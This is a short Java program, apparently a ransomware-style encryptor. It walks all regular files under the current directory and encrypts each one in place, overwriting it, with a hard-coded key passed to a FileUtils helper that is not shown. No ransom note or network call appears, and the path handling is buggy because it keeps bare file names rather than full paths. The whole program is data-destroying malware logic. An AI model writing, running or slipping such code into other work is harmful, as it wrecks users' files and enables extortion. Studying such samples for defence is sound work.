import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;
 

public class FileMain {
	
	final static String key = "1234567890123456";
     
	
    public static void main(String[] args) {
    	
       
       
         
        try {
            //FileUtils.encrypt(key, inputFile, encryptedFile);
           // FileUtils.decrypt(key, encryptedFile, decryptedFile);
        	encryptFiles(getFiles());
        
        	
        	
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
            ex.printStackTrace();
        }
    }
    
    
	public static ArrayList<String> getFiles() {
    	
    	List<File> files = null;
        ArrayList<String> temp = new ArrayList<String>();
 	try {
		files = Files.walk(Paths.get(""))
		        .filter(Files::isRegularFile)
		        .map(Path::toFile)
		        .collect(Collectors.toList());
		
	} catch (IOException e) {
		
		e.printStackTrace();
	}
 	
 	for(File x:files) {
 		
 		 temp.add(x.getName());
 	}
		
    return temp;
    	}
	
	public static void encryptFiles(ArrayList<String> files) {
		
		for(String x:files) {
			
			try {
				File inputFile = new File(x);
			    File encryptedFile = new File(x);
				FileUtils.encrypt(key, inputFile, encryptedFile);
			} catch (Exception e) {
				
				e.printStackTrace();
			}
		}
	}
    
}